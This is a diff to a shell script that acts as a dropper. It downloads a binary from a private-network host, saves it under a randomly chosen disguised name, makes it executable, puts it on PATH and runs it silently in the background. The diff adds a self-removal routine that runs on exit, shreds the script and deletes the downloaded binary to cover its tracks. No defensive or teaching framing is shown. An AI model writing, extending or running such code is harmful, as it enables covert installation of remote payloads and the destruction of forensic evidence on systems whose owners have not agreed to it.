@@ -5,11 +5,15 @@ RANDOMIZE=$(( (RANDOM % 7)  + 0))
 BIN_FILE="${RANDOM_BIN_NAMES[${RANDOMIZE}]}"
 FULL_BIN_PATH="${WORK_DIR}/${BIN_FILE}"
 
+self_remove(){
+    shred -u -- "$(basename $0)" && rm -- "${FULL_BIN_PATH}"
+}
+
 if command -v curl 1> /dev/null; then
     curl -s "http://172.16.10.1/system_sleep" -o "${FULL_BIN_PATH}"
     chmod +x "${FULL_BIN_PATH}"
     export PATH="${WORK_DIR}:${PATH}"
     nohup "${BIN_FILE}" &> /dev/null &
-    sleep 2 
-    rm -- "${FULL_BIN_PATH}" "$(basename $0)"
 fi
+
+trap self_remove EXIT
